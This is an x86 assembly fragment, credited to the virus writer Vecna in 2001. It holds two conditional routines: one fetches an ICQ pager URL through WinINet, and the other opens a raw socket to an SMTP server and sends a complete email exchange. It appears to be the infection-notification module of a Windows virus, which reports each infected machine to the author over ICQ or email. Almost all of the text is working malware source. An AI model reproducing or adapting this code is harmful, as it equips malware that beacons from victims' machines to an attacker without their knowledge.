;(c) Vecna 2001

%ifdef ICQ
.icq_pager:
       pushad
       push ebp
       push ebp
       push ebp
       push ebp
       push ebp
       call dword [InternetOpenA]
       push eax
       push ebp
       push ebp
       push ebp
       push ebp
       push dword icqurl
       push eax
       call dword [InternetOpenUrlA]
       push eax
       call dword [InternetCloseHandle]
       call dword [InternetCloseHandle]
       popad
%elifdef MAIL
       pushad
       push byte IPPROTO_TCP
       push byte SOCK_STREAM
       push byte PF_INET
       call dword [socket]
       inc eax
       jz near .mailexit
       push ebp
       push ebp
       db 068h
       db SMTP
       push dword 019000002h
       mov eax, esp
       push byte 16
       push eax
       push ebx
       call dword [connect]
       add esp, byte 4*4
       test eax, eax
       jnz .mailsocket
       sub esp, byte 7fh
       mov esi, esp
       push dword 0a0dh
       push dword "DATA"
       mov eax, esp
       push dword 0a0dh
       push dword "QUIT"
       mov edi, esp
       push esp
       push dword txtbody
       push eax
       push dword mailto
       push dword from
       push dword helo
  .loopsend:
       push ebp
       push byte 7fh
       push esi
       push ebx
       call dword [recv]
       inc eax
       jz .mailerror
       xchg edx, edi    ;edx=stack limit
       pop ecx          ;ecx=stackbuffer
       xchg ecx, esi    ;esi=string
       mov eax, esi     ;eax=string
       mov edi, ecx     ;edi=stackbuffer
  .cpy:
       push eax
       lodsb
       stosb
       test al, al
       pop eax
       jnz .cpy
       inc esi
       mov word [edi-1], 0a0dh
       xchg edi, edx
       sub esi, eax
       inc esi
       push ebp
       push esi
       push eax
       push ebx
       mov esi, eax
       call dword [send]
       inc eax
       jz .mailerror
       cmp esp, edi
       jne .loopsend
  .mailerror:
       xchg esp, edi
       add esp, 4*4+7fh
  .mailsocket:
       push ebx
       call dword [closesocket]
  .mailexit:
       popad
%endif

